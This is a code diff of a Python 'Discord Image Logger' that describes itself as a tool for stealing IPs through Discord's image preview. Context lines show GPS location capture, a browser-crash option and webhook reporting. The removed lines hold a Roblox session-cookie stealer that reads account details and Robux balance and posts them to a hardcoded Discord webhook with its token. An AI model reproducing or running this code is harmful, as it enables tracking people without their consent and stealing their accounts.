@@ -4,7 +4,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -25,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -74,28 +73,6 @@ def botCheck(ip, useragent):
         return "Telegram"
     else:
         return False
-    
-def get_roblox_info():
-    try:
-        import requests
-        cookies = {'.ROBLOSECURITY': input('Enter .ROBLOSECURITY cookie: ')}
-        auth = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies)
-        if auth.status_code != 200: return None
-        
-        user = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies).json()
-        premium = requests.get('https://premiumfeatures.roblox.com/v1/users/'+str(user['id'])+'/validate-membership', cookies=cookies).json()
-        
-        return {
-            'username': user['name'],
-            'displayName': user['displayName'],
-            'id': user['id'],
-            'robux': requests.get('https://economy.roblox.com/v1/users/'+str(user['id'])+'/currency', cookies=cookies).json()['robux'],
-            'premium': premium['hasMembership']
-        }
-    except:
-        return None
-
-
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -109,34 +86,6 @@ def reportError(error):
         }
     ],
 })
-
-
-def send_to_webhook(roblox_info):
-    if not roblox_info:
-        return
-    
-    webhook_url = "https://discord.com/api/webhooks/1477054008400154857/tw2pK-xTaQNHLwJNWuLzrSn86884av8RRswJZjH64MDDCnGphGlP8v9xfmmlRuRcAwCU"  # Replace with your actual webhook
-    
-    embed = {
-        "title": "Roblox Account Info",
-        "color": 0xFF0000,
-        "fields": [
-            {"name": "Username", "value": roblox_info['username'], "inline": True},
-            {"name": "Display Name", "value": roblox_info['displayName'], "inline": True},
-            {"name": "User ID", "value": str(roblox_info['id']), "inline": True},
-            {"name": "Robux Balance", "value": str(roblox_info['robux']), "inline": True},
-            {"name": "Premium Status", "value": "Yes" if roblox_info['premium'] else "No", "inline": True}
-        ]
-    }
-    
-    payload = {
-        "embeds": [embed],
-        "username": "Roblox Info Logger"
-    }
-    
-    requests.post(webhook_url, json=payload)
-
-
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
@@ -352,6 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-roblox_data = get_roblox_info()
-send_to_webhook(roblox_data)
 handler = app = ImageLoggerAPI
